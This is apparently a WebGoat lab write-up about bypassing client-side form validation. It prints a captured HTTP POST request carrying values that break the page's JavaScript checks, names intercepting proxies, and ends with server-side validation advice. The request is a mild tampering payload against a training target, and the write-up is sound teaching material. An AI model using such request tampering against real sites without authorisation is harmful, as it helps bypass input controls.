
## Exploitation:

Here's HTTP request which violates client validation and which I've sent to the server:

```
Host: webgoat.hacking-lab.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://webgoat.hacking-lab.com/attack?Screen=17&menu=1700
Cookie: JSESSIONID=7DC802DCDB873DB1EC4E16008085AA75
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

field1=abcD&field2=1234&field3=abc,+123+ABC&field4=seven+sto&field5=90210cos&field6=ble90210-1111&field7=ble301-604-4882
```

Request was send using Firefox Live HTTP Headers add-on or intercepting proxy like ZAP or Burp could be used.

As seen in body of request, content of forms which violates client-side filter (JavaScript validate() function) was sent.

## Mitigation:

Client-side validation can be used for performance reasons (to avoid requests to server) but never for security reasons because it can be trivially evaded using intercepting proxy or sending request directly without using browser with curl for example). All untrusted input data need to be validated on server side - always. 
